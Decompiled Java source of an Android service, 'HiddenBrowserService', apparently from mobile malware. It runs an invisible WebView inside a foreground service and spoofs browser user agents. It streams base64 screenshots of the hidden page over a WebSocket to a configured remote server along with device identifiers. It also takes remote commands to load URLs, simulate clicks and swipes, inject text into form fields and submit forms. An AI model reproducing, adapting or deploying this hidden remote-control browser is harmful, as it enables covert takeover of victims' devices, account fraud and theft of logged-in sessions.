/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Point
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.SystemClock
 *  android.util.Base64
 *  android.view.MotionEvent
 *  android.view.MotionEvent$PointerCoords
 *  android.view.MotionEvent$PointerProperties
 *  android.view.View$MeasureSpec
 *  android.webkit.CookieManager
 *  android.webkit.WebChromeClient
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebSettings$PluginState
 *  android.webkit.WebSettings$RenderPriority
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Base64;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.URI;
import java.util.regex.Pattern;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.SharedPreferencesManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONObject;

public class HiddenBrowserService
extends Service {
    private static int Notifi_ID = 111;
    private static HiddenBrowserService instance;
    private static volatile long remotethread;
    private boolean CanCapture = false;
    private OkHttpClient client;
    public String lastimg = "";
    private WebView mWebView;
    private WebSocket websocketfile;

    static {
        remotethread = 0L;
    }

    private void Sendimg(Context context, String string2) {
        if (this.websocketfile == null) {
            Request request = new Request.Builder().url(ConfigurationConstants.URL_SOCKT()).build();
            this.websocketfile = this.client.newWebSocket(request, new WebSocketListener(this, context, string2){
                final HiddenBrowserService this$0;
                final Context val$ctx;
                final String val$msg;
                {
                    this.this$0 = teizflxbclbebgztqrl2;
                    this.val$ctx = context;
                    this.val$msg = string2;
                }

                public void onClosed(WebSocket webSocket, int n, String string2) {
                    HiddenBrowserService.access$702(this.this$0, null);
                    this.this$0.client.dispatcher().executorService().shutdown();
                }

                public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                    throwable.printStackTrace();
                    HiddenBrowserService.access$702(this.this$0, null);
                }

                public void onMessage(WebSocket object, String string2) {
                    try {
                        object = new JSONObject(string2);
                        object = object.optString("type", "empty");
                        if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                            HiddenBrowserService.access$702(this.this$0, null);
                            this.this$0.client.dispatcher().executorService().shutdown();
                            this.this$0.StopRemoteThread(this.val$ctx);
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }

                public void onOpen(WebSocket webSocket, Response response) {
                    this.this$0.sendWebSocketMessage(this.val$ctx, this.val$msg);
                }
            });
        } else {
            this.sendWebSocketMessage(context, string2);
        }
    }

    static /* synthetic */ long access$302(long l) {
        remotethread = l;
        return l;
    }

    static /* synthetic */ boolean access$402(HiddenBrowserService teizflxbclbebgztqrl2, boolean bl) {
        teizflxbclbebgztqrl2.CanCapture = bl;
        return bl;
    }

    static /* synthetic */ WebSocket access$702(HiddenBrowserService teizflxbclbebgztqrl2, WebSocket webSocket) {
        teizflxbclbebgztqrl2.websocketfile = webSocket;
        return webSocket;
    }

    public static HiddenBrowserService getinstance() {
        return instance;
    }

    private static boolean isRemotethreadlive() {
        long l = remotethread;
        boolean bl = false;
        if (l == 0L) {
            return false;
        }
        if (System.currentTimeMillis() - remotethread < 30000L) {
            bl = true;
        }
        return bl;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void sendWebSocketMessage(Context context, String string2) {
        try {
            String string3 = SharedPreferencesManager.Read(context, "ID", "Deviceid");
            String string4 = SharedPreferencesManager.Read(context, ConfigurationConstants.THE_IDF, null);
            if (string3 != null && string4 != null) {
                String string5 = SharedPreferencesManager.Read(context, ConfigurationConstants.THE_CIP, "null");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("idf", (Object)string4);
                jSONObject.put("pid", (Object)string3);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)"msg");
                jSONObject.put("msg", (Object)string2);
                jSONObject.put("cip", (Object)string5);
                jSONObject.put("conk", (Object)SharedPreferencesManager.Read(context, "red_k", ConfigurationProvider.CONS_KY));
                this.websocketfile.send(jSONObject.toString());
                return;
            }
            this.websocketfile.close(1000, "Missing ID");
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            if (this.websocketfile == null) return;
            this.websocketfile.close(1000, "Error during message sending");
        }
    }

    private void simulateClick(float f, float f2) {
        long l = SystemClock.uptimeMillis();
        long l2 = SystemClock.uptimeMillis();
        MotionEvent motionEvent = new MotionEvent.PointerProperties[1];
        MotionEvent.PointerCoords[] pointerCoordsArray = new MotionEvent.PointerProperties();
        pointerCoordsArray.id = 0;
        pointerCoordsArray.toolType = 1;
        motionEvent[0] = pointerCoordsArray;
        pointerCoordsArray = new MotionEvent.PointerCoords[1];
        MotionEvent.PointerCoords pointerCoords = new MotionEvent.PointerCoords();
        pointerCoords.x = f;
        pointerCoords.y = f2;
        pointerCoords.pressure = 1.0f;
        pointerCoords.size = 1.0f;
        pointerCoordsArray[0] = pointerCoords;
        pointerCoords = MotionEvent.obtain((long)l, (long)l2, (int)0, (int)1, (MotionEvent.PointerProperties[])motionEvent, (MotionEvent.PointerCoords[])pointerCoordsArray, (int)0, (int)0, (float)1.0f, (float)1.0f, (int)0, (int)0, (int)0, (int)0);
        this.mWebView.dispatchTouchEvent((MotionEvent)pointerCoords);
        motionEvent = MotionEvent.obtain((long)l, (long)l2, (int)1, (int)1, (MotionEvent.PointerProperties[])motionEvent, (MotionEvent.PointerCoords[])pointerCoordsArray, (int)0, (int)0, (float)1.0f, (float)1.0f, (int)0, (int)0, (int)0, (int)0);
        this.mWebView.dispatchTouchEvent(motionEvent);
    }

    private void startWebViewInBackground(String string2, String string3) {
        this.mWebView = new WebView((Context)this);
        this.mWebView.getSettings().setJavaScriptEnabled(true);
        try {
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(this.mWebView, true);
        }
        catch (Exception exception) {
            // empty catch block
        }
        this.mWebView.getSettings().setLoadsImagesAutomatically(true);
        this.mWebView.getSettings().setLoadWithOverviewMode(true);
        this.mWebView.getSettings().setUseWideViewPort(true);
        this.mWebView.setScrollBarStyle(0);
        this.mWebView.getSettings().setAllowFileAccess(true);
        this.mWebView.getSettings().setCacheMode(1);
        this.mWebView.getSettings().setDomStorageEnabled(true);
        this.mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowContentAccess(true);
        try {
            this.mWebView.setLayerType(2, null);
            this.mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
            this.mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            this.mWebView.setBackgroundColor(-1);
        }
        catch (Exception exception) {
            // empty catch block
        }
        this.mWebView.getSettings().setBuiltInZoomControls(false);
        if (string3.equals("a")) {
            if (!string2.contains("google.com") && !string2.contains("youtube.com")) {
                this.mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; SM-A146P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.5845.187 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.39.113;]");
            } else {
                this.mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.187 Mobile Safari/537.36");
            }
        } else if (string3.startsWith("<c>")) {
            string3 = string3.replace("<c>", "");
            this.mWebView.getSettings().setUserAgentString(string3);
        } else {
            string3 = this.mWebView.getSettings().getUserAgentString();
            this.mWebView.getSettings().setUserAgentString(string3);
        }
        this.mWebView.setWebChromeClient((WebChromeClient)new MyChrome(this));
        this.mWebView.setWebViewClient((WebViewClient)new MyWebViewClient(this));
        this.mWebView.measure(View.MeasureSpec.makeMeasureSpec((int)720, (int)0x40000000), View.MeasureSpec.makeMeasureSpec((int)1280, (int)0x40000000));
        this.mWebView.layout(0, 0, this.mWebView.getMeasuredWidth(), this.mWebView.getMeasuredHeight());
        this.mWebView.loadUrl(string2);
        if (!HiddenBrowserService.isRemotethreadlive()) {
            this.RemoteLive(this.getApplicationContext());
        }
    }

    private void startforground(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void RemoteLive(Context context) {
        new Thread(new Runnable(){
            final HiddenBrowserService this$0;
            final Context val$ctx;
            {
                this.this$0 = teizflxbclbebgztqrl2;
                this.val$ctx = context;
            }

            @Override
            public void run() {
                do {
                    HiddenBrowserService.access$302(System.currentTimeMillis());
                    try {
                        Thread.sleep(100L);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    try {
                        if (!this.this$0.CanCapture) continue;
                        Bitmap bitmap = Bitmap.createScaledBitmap((Bitmap)this.this$0.captureWebView(this.this$0.mWebView), (int)350, (int)650, (boolean)true);
                        Object object = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.WEBP, 70, (OutputStream)object);
                        object = Base64.encodeToString((byte[])((ByteArrayOutputStream)object).toByteArray(), (int)0);
                        if (this.this$0.lastimg.equals(object)) continue;
                        this.this$0.lastimg = object;
                        bitmap = new JSONObject();
                        bitmap.put("type", (Object)"wbbrow");
                        bitmap.put("img", object);
                        bitmap.put("cuz", (Object)"h");
                        object = bitmap.toString();
                        this.this$0.Sendimg(this.val$ctx, (String)object);
                    }
                    catch (Exception exception) {
                        AndroidLogger.Error("RemoteLive", exception.getMessage());
                    }
                } while (SharedPreferencesManager.ReadBool(this.val$ctx, ConfigurationConstants.Hidden_browser, false));
            }
        }).start();
    }

    public void StopRemoteThread(Context context) {
        SharedPreferencesManager.WriteBool(context, ConfigurationConstants.Hidden_browser, false);
        remotethread = 0L;
    }

    public Bitmap captureWebView(WebView webView) {
        this.mWebView.setDrawingCacheEnabled(true);
        webView = Bitmap.createScaledBitmap((Bitmap)this.mWebView.getDrawingCache(false), (int)720, (int)1280, (boolean)false);
        this.mWebView.setDrawingCacheEnabled(false);
        return webView;
    }

    public void closeWebSocket() {
        if (this.websocketfile != null) {
            this.websocketfile.close(1000, "Closing WebSocket");
            this.websocketfile = null;
        }
        if (this.client != null) {
            this.client.dispatcher().cancelAll();
            this.client.connectionPool().evictAll();
            this.client.dispatcher().executorService().shutdown();
            this.client = null;
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void controlbrowser(String[] stringArray, Context context) {
        int n;
        Point[] pointArray;
        block20: {
            pointArray = stringArray[0];
            context = new Handler(context.getMainLooper());
            switch (pointArray.hashCode()) {
                case 96667352: {
                    if (!pointArray.equals("enter")) break;
                    n = 0;
                    break block20;
                }
                case 94750088: {
                    if (!pointArray.equals("click")) break;
                    n = 4;
                    break block20;
                }
                case 3556653: {
                    if (!pointArray.equals("text")) break;
                    n = 2;
                    break block20;
                }
                case 3327206: {
                    if (!pointArray.equals("load")) break;
                    n = 1;
                    break block20;
                }
                case 108835: {
                    if (!pointArray.equals("nav")) break;
                    n = 5;
                    break block20;
                }
                case -907680051: {
                    if (!pointArray.equals("scroll")) break;
                    n = 3;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return;
            }
            case 5: {
                context.postDelayed(new Runnable(){
                    final HiddenBrowserService this$0;
                    final int val$isback;
                    {
                        this.this$0 = teizflxbclbebgztqrl2;
                        this.val$isback = n;
                    }

                    @Override
                    public void run() {
                        try {
                            if (this.val$isback == 2) {
                                this.this$0.mWebView.loadUrl("javascript:window.location.reload(true)");
                            } else if (this.val$isback == 1) {
                                if (this.this$0.mWebView.canGoForward()) {
                                    this.this$0.mWebView.goForward();
                                }
                            } else if (this.val$isback == 0 && this.this$0.mWebView.canGoBack()) {
                                this.this$0.mWebView.goBack();
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }, 1L);
                return;
            }
            case 4: {
                context.postDelayed(new Runnable(){
                    final HiddenBrowserService this$0;
                    final int val$x;
                    final int val$y;
                    {
                        this.this$0 = teizflxbclbebgztqrl2;
                        this.val$x = n;
                        this.val$y = n2;
                    }

                    @Override
                    public void run() {
                        try {
                            this.this$0.simulateClick(this.val$x, this.val$y);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }, 1L);
                return;
            }
            case 3: {
                stringArray = stringArray[1].split(Pattern.quote(":"));
                pointArray = new Point[stringArray.length];
                n = 0;
                while (true) {
                    if (n >= stringArray.length) {
                        context.postDelayed(new Runnable(){
                            final HiddenBrowserService this$0;
                            final Point[] val$movements;
                            {
                                this.this$0 = teizflxbclbebgztqrl2;
                                this.val$movements = pointArray;
                            }

                            @Override
                            public void run() {
                                try {
                                    this.this$0.simulateSwipe(this.val$movements, 1500L);
                                }
                                catch (Exception exception) {
                                    // empty catch block
                                }
                            }
                        }, 1L);
                        return;
                    }
                    try {
                        Point point = stringArray[n].replace("(", "").replace(")", "").split(", ");
                        int n2 = Integer.parseInt(point[0]);
                        int n3 = Integer.parseInt(point[1]);
                        pointArray[n] = point = new Point(n2, n3);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                    ++n;
                }
            }
            case 2: {
                context.postDelayed(new Runnable(){
                    final HiddenBrowserService this$0;
                    final String val$text;
                    {
                        this.this$0 = teizflxbclbebgztqrl2;
                        this.val$text = string2;
                    }

                    @Override
                    public void run() {
                        try {
                            WebView webView = this.this$0.mWebView;
                            StringBuilder stringBuilder = new StringBuilder();
                            webView.evaluateJavascript(stringBuilder.append("document.activeElement.value = '").append(this.val$text).append("';").toString(), null);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }, 1L);
                return;
            }
            case 1: {
                context.postDelayed(new Runnable(){
                    final HiddenBrowserService this$0;
                    final String val$newurl;
                    {
                        this.this$0 = teizflxbclbebgztqrl2;
                        this.val$newurl = string2;
                    }

                    @Override
                    public void run() {
                        try {
                            this.this$0.mWebView.loadUrl(this.val$newurl);
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }, 1L);
                return;
            }
            case 0: 
        }
        context.postDelayed(new Runnable(this){
            final HiddenBrowserService this$0;
            {
                this.this$0 = teizflxbclbebgztqrl2;
            }

            @Override
            public void run() {
                try {
                    this.this$0.mWebView.evaluateJavascript("if (document.activeElement.form) {   document.activeElement.form.submit(); } else {   var keydownEvent = new KeyboardEvent('keydown', {key: 'Enter', keyCode: 13, which: 13});   document.activeElement.dispatchEvent(keydownEvent);   var keyupEvent = new KeyboardEvent('keyup', {key: 'Enter', keyCode: 13, which: 13});   document.activeElement.dispatchEvent(keyupEvent);   var searchButton = document.querySelector(\"input[name='btnK'], button[type='submit']\");   if (searchButton) { searchButton.click(); } }", null);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }, 1L);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        instance = this;
        this.startforground(this.getApplicationContext());
    }

    public void onDestroy() {
        super.onDestroy();
        this.closeWebSocket();
        this.stopSelf();
    }

    public int onStartCommand(Intent object, int n, int n2) {
        try {
            if (object.hasExtra("starturl")) {
                Object object2;
                this.client = object2 = new OkHttpClient();
                object2 = object.getStringExtra("starturl");
                object = object.getStringExtra("ua");
                instance = this;
                this.startforground(this.getApplicationContext());
                this.startWebViewInBackground((String)object2, (String)object);
                return 1;
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        return 2;
    }

    public void simulateSwipe(Point[] motionEvent, long l) {
        MotionEvent motionEvent2;
        long l2;
        long l3 = l / (long)(((Point[])motionEvent).length - 1);
        l = l2 = SystemClock.uptimeMillis();
        MotionEvent motionEvent3 = MotionEvent.obtain((long)l2, (long)l, (int)0, (float)motionEvent[0].x, (float)motionEvent[0].y, (int)0);
        this.mWebView.dispatchTouchEvent(motionEvent3);
        for (int i = 1; i < ((Point[])motionEvent).length; ++i) {
            float f = motionEvent[i].x;
            float f2 = motionEvent[i].y;
            motionEvent2 = MotionEvent.obtain((long)l2, (long)(l += l3), (int)2, (float)f, (float)f2, (int)0);
            this.mWebView.dispatchTouchEvent(motionEvent2);
        }
        motionEvent2 = MotionEvent.obtain((long)l2, (long)(l + l3), (int)1, (float)motionEvent[((Point[])motionEvent).length - 1].x, (float)motionEvent[((Point[])motionEvent).length - 1].y, (int)0);
        this.mWebView.dispatchTouchEvent(motionEvent2);
        l = SystemClock.uptimeMillis();
        MotionEvent motionEvent4 = MotionEvent.obtain((long)l, (long)l, (int)0, (float)motionEvent[((Point[])motionEvent).length - 1].x, (float)motionEvent[((Point[])motionEvent).length - 1].y, (int)0);
        this.mWebView.dispatchTouchEvent(motionEvent4);
        try {
            Thread.sleep(100L);
        }
        catch (InterruptedException interruptedException) {
            interruptedException.printStackTrace();
        }
        motionEvent = MotionEvent.obtain((long)l, (long)SystemClock.uptimeMillis(), (int)1, (float)motionEvent[((Point[])motionEvent).length - 1].x, (float)motionEvent[((Point[])motionEvent).length - 1].y, (int)0);
        this.mWebView.dispatchTouchEvent(motionEvent);
        motionEvent3.recycle();
        motionEvent2.recycle();
        motionEvent4.recycle();
        motionEvent.recycle();
    }

    public class MyChrome
    extends WebChromeClient {
        final HiddenBrowserService this$0;

        MyChrome(HiddenBrowserService teizflxbclbebgztqrl2) {
            this.this$0 = teizflxbclbebgztqrl2;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final HiddenBrowserService this$0;

        private MyWebViewClient(HiddenBrowserService teizflxbclbebgztqrl2) {
            this.this$0 = teizflxbclbebgztqrl2;
        }

        public void onPageFinished(WebView webView, String string2) {
            super.onPageFinished(webView, string2);
            HiddenBrowserService.access$402(this.this$0, true);
        }

        public void onPageStarted(WebView webView, String string2, Bitmap bitmap) {
            super.onPageStarted(webView, string2, bitmap);
            HiddenBrowserService.access$402(this.this$0, false);
        }

        public void onReceivedError(WebView webView, int n, String string2, String string3) {
        }

        public boolean shouldOverrideUrlLoading(WebView object, WebResourceRequest object2) {
            if (object2 != null && object2.getUrl() != null && !((String)(object2 = object2.getUrl().toString())).startsWith("http") && ((String)object2).contains("://")) {
                try {
                    object = new URI((String)object2);
                    object2 = new StringBuilder();
                    object = ((StringBuilder)object2).append(((URI)object).getHost()).append(((URI)object).getPath()).toString();
                    HiddenBrowserService.access$402(this.this$0, false);
                    this.this$0.mWebView.loadUrl((String)object);
                    return true;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
            return false;
        }
    }
}

